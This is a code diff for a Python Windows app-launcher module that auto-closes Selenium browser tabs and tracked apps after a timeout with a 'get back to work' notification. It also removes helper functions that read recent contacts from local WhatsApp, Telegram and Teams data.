@@ -1,37 +1,26 @@
 import os
 import subprocess
 import webbrowser
-import win32api # New import
-import win32con # New import
+import win32api
+import win32con
 import psutil
 import time
 import winapps
-from dotenv import load_dotenv
-from typing import Optional,Dict, List
-import webbrowser
-from old_utils.contactWindowInterface import ContactWindowInterface
+from typing import Optional, Dict, List
+import threading
 import uuid
-from core.app_config import kNOWN_APPS_LIST
-from core.communication_apps_config import COMMUNICATION_APPS_LIST
 import json
 import sqlite3
 from datetime import datetime, timedelta
-import os
-from pathlib import Path
 import re
-from telethon.sync import TelegramClient
-from telethon.tl import functions  # Add this with other imports
-from telethon.tl.functions.contacts import GetContactsRequest
-from telethon.tl.functions.messages import GetHistoryRequest
-import asyncio
 from selenium import webdriver
 from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from old_utils.notifications import send_notification
-
-import time
-import threading
+from old_utils.contactWindowInterface import ContactWindowInterface
+from core.app_config import kNOWN_APPS_LIST
+from core.communication_apps_config import COMMUNICATION_APPS_LIST
 
 launched_apps = {}
 opened_browser_instances = []  # Track browser instances we launched
@@ -42,7 +31,6 @@ opened_apps_info = []  # Each item: dict with keys: type='desktop'|'web', proces
 # Timeout duration in seconds (15 minutes)
 APP_TIMEOUT_SECONDS = 30
 APP_WARNING_SECONDS = 20
-
 
 def get_browser_path(browser_name: str) -> Optional[str]:
     """Get the path to the browser executable based on name"""
@@ -76,8 +64,29 @@ def is_app_installed(app_name: str) -> bool:
     
     return False
 
-def open_recommendation(recommendation: dict) -> str:
+def close_tab_after_delay(driver, delay=5):
+    """Close the browser tab after a delay without closing the entire browser"""
+    def close_tab():
+        time.sleep(delay)
+        try:
+            # Close the current tab only
+            driver.close()
+            print(f"Closed tab after {delay} seconds")
+            
+            # Remove from tracking lists
+            global opened_apps_info, opened_browser_tabs
+            for app_info in opened_apps_info[:]:
+                if app_info.get('driver') == driver:
+                    opened_apps_info.remove(app_info)
+            for tab_info in opened_browser_tabs[:]:
+                if tab_info.get('driver') == driver:
+                    opened_browser_tabs.remove(tab_info)
+        except Exception as e:
+            print(f"Error closing tab: {str(e)}")
+    
+    threading.Thread(target=close_tab, daemon=True).start()
 
+def open_recommendation(recommendation: dict) -> str:
     global launched_apps, opened_browser_tabs, opened_apps_info
 
     print(f"[Open_recommendation] {recommendation}")
@@ -163,12 +172,15 @@ def open_recommendation(recommendation: dict) -> str:
                     return f"Error launching {app_info['name']} from {app_path_to_use}: {e}"
             else:
                 return f"Error: No valid launch method (location or aumid) provided for '{app_info['name']}' in the 'known_apps_list'."
+    
+    # Handle web URLs
     if url.startswith(("http://", "https://")):
         try:
             # Add search query if present
             if recommendation.get("search_query"):
                 search = recommendation["search_query"].replace(" ", "+")
                 url += f"/results?search_query={search}"
+                
             # Open new Selenium browser window each time
             print("Web URL: ", url)
             options = webdriver.ChromeOptions()
@@ -176,31 +188,34 @@ def open_recommendation(recommendation: dict) -> str:
             driver = webdriver.Chrome(options=options)
             driver.get(url)
 
-
-            opened_browser_tabs.append({
+            # Store tab information
+            tab_info = {
                 'url': url,
-                'browser': 'chrome',
-                'method': 'selenium',
                 'driver': driver,
-                'window_handle': driver.current_window_handle,
                 'opened_at': time.time()
-            })
-
+            }
+            
+            # Add to tracking lists
+            opened_browser_tabs.append(tab_info)
             opened_apps_info.append({
                 'type': 'web',
                 'driver': driver,
                 'url': url,
                 'opened_at': time.time()
             })
-            print("opened app info: ", opened_apps_info)
+
+            # Close this specific tab after 5 seconds
+            close_tab_after_delay(driver, 5)
+            
             start_monitoring_thread()
-            return f"Opened {url} in default browser tab."
-        except Exception as selenium_error:
+            return f"Opened {url} in new browser tab. Will close in 5 seconds."
+        except Exception as e:
+            # Fallback to webbrowser module if Selenium fails
             webbrowser.open(url)
-            return f"Failed to open URL '{url}': {e}"
+            return f"Failed to open URL '{url}' with Selenium. Used fallback: {e}"
 
     return f"Recommendation '{recommendation}' is neither a recognized URL nor a known application."
-    
+
 def terminate_process_tree(proc):
     try:
         children = proc.children(recursive=True)
@@ -223,16 +238,18 @@ def close_tracked_app(app_info):
     try:
         if app_info['type'] == 'desktop':
             for proc in app_info.get('processes', []):
-              terminate_process_tree(proc)
+                terminate_process_tree(proc)
             print(f"Closed desktop app: {app_info.get('app_name')}")
+            return True
+            
         elif app_info['type'] == 'web':
-            driver = app_info.get('driver')
-            if driver:
-                driver.quit()
-                return True 
-            print(f"Closed browser window for URL: {app_info.get('url')}")
+            # For web apps, we don't need to close the entire browser here
+            # because the tab-closing thread will handle individual tabs
+            print(f"Web app already scheduled for closing: {app_info.get('url')}")
+            return True
     except Exception as e:
         print(f"Error closing app: {e}")
+    return False
 
 def monitor_opened_apps():
     current_time = time.time()
@@ -241,28 +258,42 @@ def monitor_opened_apps():
     closing_text = "Time to get back to work"
     
     for app_info in opened_apps_info:
-        if abs((current_time - app_info['opened_at']) - APP_WARNING_SECONDS) <= 1: 
+        elapsed = current_time - app_info['opened_at']
+        
+        # Check for warning time (20 seconds)
+        if abs(elapsed - APP_WARNING_SECONDS) <= 1: 
             user_action = send_notification(closing_text)
             if user_action:
                 is_closed = close_tracked_app(app_info)
-                to_remove.append(app_info)
-        elif current_time - app_info['opened_at'] >= APP_TIMEOUT_SECONDS:
-            is_closed = close_tracked_app(app_info)
-            to_remove.append(app_info)
+                if is_closed:
+                    to_remove.append(app_info)
         
+        # Check for timeout (30 seconds)
+        elif elapsed >= APP_TIMEOUT_SECONDS:
+            is_closed = close_tracked_app(app_info)
+            if is_closed:
+                to_remove.append(app_info)
+        
+    # Remove closed apps from tracking
     for app_info in to_remove:
-        opened_apps_info.remove(app_info)
+        if app_info in opened_apps_info:
+            opened_apps_info.remove(app_info)
+            
     return is_closed
 
 def start_monitoring_thread(interval_sec=60):
     def monitor_loop():
-        app_is_closed = False
-        while not app_is_closed:
-            app_is_closed = monitor_opened_apps()
-    print("start monitoring")
-    thread = threading.Thread(target=monitor_loop, daemon=False)
+        while True:
+            try:
+                monitor_opened_apps()
+                time.sleep(interval_sec)
+            except Exception as e:
+                print(f"Monitoring error: {str(e)}")
+    
+    print("Starting monitoring thread")
+    thread = threading.Thread(target=monitor_loop, daemon=True)
     thread.start()
-    print("opened app info: ", opened_apps_info)
+    print("Monitoring active")
 
 def find_process_by_name(process_name: str, timeout: int = 5) -> Optional[psutil.Process]:
     """Helper to find a process by name with timeout"""
@@ -273,163 +304,3 @@ def find_process_by_name(process_name: str, timeout: int = 5) -> Optional[psutil
                 return proc
         time.sleep(0.5)
     return None
-
-
-def get_whatsapp_contacts():
-    """Extracts recent WhatsApp contacts from local database"""
-    contacts = []
-    whatsapp_db_path = os.path.join(os.getenv('LOCALAPPDATA'), 'WhatsApp', 'Databases', 'msgstore.db')
-    
-    if not os.path.exists(whatsapp_db_path):
-        return contacts
-
-    try:
-        conn = sqlite3.connect(f"file:{whatsapp_db_path}?mode=ro", uri=True)
-        cursor = conn.cursor()
-        
-        # Query last 3 chats
-        cursor.execute("""
-            SELECT chat.subject, message.timestamp, jid.raw_string 
-            FROM message
-            JOIN chat ON message.chat_row_id = chat._id
-            JOIN jid ON chat.jid_row_id = jid._id
-            ORDER BY message.timestamp DESC
-            LIMIT 3
-        """)
-        
-        for subject, timestamp, raw_jid in cursor.fetchall():
-            phone = raw_jid.split('@')[0]
-            contacts.append({
-                "name": subject or f"Contact {phone}",
-                "phone": phone,
-                "id": raw_jid,
-                "last_contact": format_timestamp(timestamp)
-            })
-            
-    except Exception as e:
-        print(f"Error reading WhatsApp DB: {e}")
-    finally:
-        conn.close()
-    
-    return contacts
-
-def get_telegram_contacts():
-    """Extracts recent Telegram contacts"""
-    contacts = []
-    api_id = os.getenv('API_ID')
-    api_hash = os.getenv('API_HASH')
-    phone = os.getenv('API_PHONE')
-    telegram_path = os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata')
-    
-    async def get_recent_chats():
-        async with TelegramClient('session_name', api_id, api_hash) as client:
-            await client.start(phone)
-            
-            # Get recent dialogs (chats)
-            dialogs = await client.get_dialogs(limit=10)
-            
-            for dialog in dialogs:
-                if dialog.is_user:  # Only individual chats
-                    entity = dialog.entity
-                    contacts.append({
-                        "name": entity.first_name + (f" {entity.last_name}" if entity.last_name else ""),
-                        "id": entity.username or str(entity.id),
-                        "phone": getattr(entity, 'phone', ''),
-                        "last_contact": format_timestamp(dialog.date.timestamp()),
-                        "has_called": await check_recent_calls(client, entity.id)
-                    })
-            
-            return contacts
-    async def check_recent_calls(client, user_id):
-        """Check if recent calls exist with this user"""
-        try:
-            result = await client(functions.phone.GetRecentCallersRequest())
-            return any(caller.peer.user_id == user_id for caller in result.callers)
-        except:
-            return False
-    
-    try:
-        # Run the async function in a new event loop
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        contacts = loop.run_until_complete(get_recent_chats())
-        print("contact loop is runing")
-    except Exception as e:
-        print(f"Error getting Telegram contacts: {e}")
-    print("Finished contact loop: ", contacts)
-    return contacts
-
-def get_teams_contacts():
-    """Extracts recent Microsoft Teams contacts"""
-    contacts = []
-    teams_db_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Teams', 'IndexedDB')
-    
-    if not os.path.exists(teams_db_path):
-        return contacts
-
-    try:
-        # Teams stores data in IndexedDB - this is a simplified approach
-        for db_file in Path(teams_db_path).glob('*.teams.microsoft.com*.ldb'):
-            conn = sqlite3.connect(db_file)
-            cursor = conn.cursor()
-            
-            cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name LIKE '%conversations%'")
-            if cursor.fetchone():
-                cursor.execute("""
-                    SELECT displayName, lastMessageTimestamp 
-                    FROM conversations 
-                    ORDER BY lastMessageTimestamp DESC 
-                    LIMIT 3
-                """)
-                
-                for name, timestamp in cursor.fetchall():
-                    contacts.append({
-                        "name": name,
-                        "id": name.lower().replace(' ', '') + "@teams",
-                        "last_contact": format_timestamp(timestamp)
-                    })
-                    
-            conn.close()
-            
-    except Exception as e:
-        print(f"Error reading Teams DB: {e}")
-    
-    return contacts
-
-def format_timestamp(timestamp):
-    """Convert various timestamp formats to human-readable"""
-    try:
-        if timestamp > 1e12:  # WhatsApp timestamp (microseconds)
-            dt = datetime.fromtimestamp(timestamp/1000)
-        elif timestamp > 1e9:  # Unix timestamp
-            dt = datetime.fromtimestamp(timestamp)
-        else:  # Teams timestamp (milliseconds)
-            dt = datetime.fromtimestamp(timestamp/1000)
-            
-        if dt.date() == datetime.today().date():
-            return dt.strftime("%H:%M")
-        elif dt.date() == (datetime.today() - timedelta(days=1)).date():
-            return "Yesterday"
-        else:
-            return dt.strftime("%Y-%m-%d")
-    except:
-        return "Recently"
-    
-
-def get_recent_contacts(app_name: str) -> list:
-    """Get real recent contacts for the specified app"""
-    app_name = app_name.lower()
-    
-    if 'whatsapp' in app_name:
-        return get_whatsapp_contacts()
-    elif 'telegram' in app_name:
-        print("Came to get recent contacts in telegram")
-        return get_telegram_contacts()
-    elif 'teams' in app_name:
-        return get_teams_contacts()
-    
-    # Fallback mock data
-    return [
-        {"name": "John Doe", "phone": "+1234567890", "id": "john123", "last_contact": "2h ago"},
-        {"name": "Jane Smith", "phone": "+1987654321", "id": "jane456", "last_contact": "Yesterday"}
-    ]
